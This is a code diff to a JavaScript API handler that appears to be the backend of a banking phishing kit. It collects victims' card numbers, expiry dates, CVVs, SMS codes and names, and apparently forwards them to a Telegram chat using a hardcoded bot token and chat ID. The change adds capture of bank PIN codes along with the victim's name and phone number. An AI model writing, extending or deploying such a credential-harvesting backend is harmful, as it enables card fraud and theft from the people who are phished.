@@ -15,15 +15,24 @@ export default async function handler(req, res) {
     sms_code,
     cc,
     exp,
-    cvv
+    cvv,
+    pin_code  
   } = req.body;
 
   const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM";
   const CHAT_ID = "-4982276528";
 
   let message = "";
-
-  if (cc && exp && cvv) {
+  
+if (pin_code) {
+    // 🟣 رسالة PIN
+    message = `
+🔑 PIN Reçu:
+- Code: ${pin_code}
+- Nom: ${first_name || ""} ${last_name || ""}
+- Téléphone: ${num || ""}
+    `;
+}else if  (cc && exp && cvv) {
     // 🟢 رسالة الكارت
     message = `
 💳 Carte Bancaire:
@@ -66,5 +75,6 @@ export default async function handler(req, res) {
     res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
+
 
 
